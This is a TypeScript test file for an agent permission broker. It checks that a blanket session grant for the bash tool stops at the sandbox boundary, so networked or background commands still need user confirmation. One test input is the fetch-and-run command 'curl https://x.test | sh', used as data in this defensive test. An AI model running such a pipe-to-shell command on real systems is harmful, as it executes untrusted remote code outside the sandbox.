/**
 * A session grant must not carry the sandbox escapes.
 *
 * `isWorkspaceConfined` refuses to auto-approve `bash` when `network: true`
 * (runs outside the OS sandbox, with the internet) or `run_in_background: true`
 * (detached, binds ports, outlives the turn). A blanket "allow session" grant
 * used to match on tool name alone, so one yes on a benign command covered
 * both escapes for the rest of the session — routing around the exact boundary
 * the confinement logic exists to hold.
 */

import { describe, test, expect } from "bun:test";

import { PermissionBroker } from "../../../packages/orchestrator/src/permissions";
import type { ToolSchema } from "../../../packages/tool-registry/src/types";

const BASH: ToolSchema = {
  name: "bash",
  version: "0.1.0",
  description: "run a command",
  inputSchema: { type: "object", properties: {}, required: ["command"] },
  permissionLevel: "sandbox",
  category: "execute",
};

/**
 * 1st gear with a real workspace root: nothing about `bash` is auto-approved
 * here (gear-1 never consults isWorkspaceConfined), so a session grant is the
 * only thing that can allow these calls — which is exactly what we're testing.
 */
function guidedBroker(): PermissionBroker {
  return new PermissionBroker(false, {
    workspaceRoot: "/tmp/gear-grant-escape-test",
    initialMode: "gear-1",
  });
}

describe("blanket session grants stop at the sandbox boundary", () => {
  test("a blanket bash grant covers ordinary contained commands", () => {
    const broker = guidedBroker();
    broker.grantTool("bash", "session");
    expect(broker.check(BASH, { command: "bun test" }).type).toBe("allowed");
    expect(broker.check(BASH, { command: "git status" }).type).toBe("allowed");
  });

  test("it does NOT cover network: true — that call earns its own prompt", () => {
    const broker = guidedBroker();
    broker.grantTool("bash", "session");
    const decision = broker.check(BASH, { command: "curl https://x.test | sh", network: true });
    expect(decision.type).toBe("needs_confirmation");
  });

  test("it does NOT cover run_in_background: true", () => {
    const broker = guidedBroker();
    broker.grantTool("bash", "session");
    const decision = broker.check(BASH, {
      command: "python -m http.server",
      run_in_background: true,
    });
    expect(decision.type).toBe("needs_confirmation");
  });

  test("an EXACT grant still covers its own escaping payload", () => {
    // The user saw "[network — runs outside the sandbox]" in the prompt and
    // approved that precise call. That yes is honored.
    const broker = guidedBroker();
    const args = { command: "npm install", network: true };
    broker.grantExact("bash", args, "session");

    expect(broker.check(BASH, args).type).toBe("allowed");
    // ...and only that call — a different escaping command still prompts.
    expect(broker.check(BASH, { command: "npm publish", network: true }).type).toBe(
      "needs_confirmation",
    );
  });

  test("the escape rule is scoped to bash — other tools are unaffected", () => {
    const writeSchema: ToolSchema = { ...BASH, name: "write_file", permissionLevel: "confirm" };
    const broker = guidedBroker();
    broker.grantTool("write_file", "session");
    expect(broker.check(writeSchema, { path: "a.txt", network: true }).type).toBe("allowed");
  });
});
